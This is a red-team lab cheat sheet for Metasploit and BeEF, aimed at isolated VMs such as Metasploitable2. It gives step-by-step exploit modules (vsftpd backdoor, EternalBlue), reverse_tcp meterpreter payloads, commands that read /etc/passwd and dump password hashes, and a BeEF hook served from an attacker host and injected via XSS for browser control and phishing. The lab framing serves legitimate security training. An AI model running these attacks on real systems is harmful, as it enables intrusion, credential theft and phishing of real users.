# Red Team Lab — Metasploit (Isolated VMs Only)

## Lab network setup
```
[Attacker Kali] ---- host-only / NAT ---- [Target Metasploitable2]
                      192.168.56.0/24
```
- Snapshot VMs before each session
- No bridge mode to production LAN
- Firewall: allow only lab subnet

## Metasploit quickstart
```bash
msfconsole
db_status                    # optional: msfdb init
workspace -a lab_session
```

## Basic workflow
```bash
# 1. Scan (or import nmap)
db_nmap -sV 192.168.56.101

# 2. Search modules
search type:exploit platform:linux vsftpd
search cve:2017-0144

# 3. Use module
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
check
run

# 4. Post-exploitation (lab)
sessions -l
sessions -i 1
sysinfo
getuid
```

## Common lab modules
| Target | Module |
|--------|--------|
| vsftpd 2.3.4 | `exploit/unix/ftp/vsftpd_234_backdoor` |
| MS17-010 | `exploit/windows/smb/ms17_010_eternalblue` |
| Tomcat mgr | `exploit/multi/http/tomcat_mgr_upload` |
| PHP CGI | `exploit/multi/http/php_cgi_arg_injection` |

## Payload selection (lab)
```bash
set payload linux/x86/meterpreter/reverse_tcp
set payload windows/x64/meterpreter/reverse_tcp
```

## Meterpreter basics
```bash
sysinfo
shell
upload /local/path /remote/path
download /etc/passwd .
hashdump          # Windows lab only
run post/multi/recon/local_exploit_suggester
```

## BEEF integration (lab)
1. Start BEEF: `beef-xss` (default http://127.0.0.1:3000/ui/panel)
2. Hook URL: `http://<attacker_ip>:3000/hook.js`
3. Inject hook via stored/reflected XSS in **lab app only**
4. Demonstrate browser control: alert, redirect, phish template on fake login page in lab

## Reporting
Document: module used, payload, access gained, lateral movement (if any), remediation

## Never
- Run exploits against internet hosts without contract
- Leave persistent backdoors outside lab
- Use BEEF hooks on real user browsers
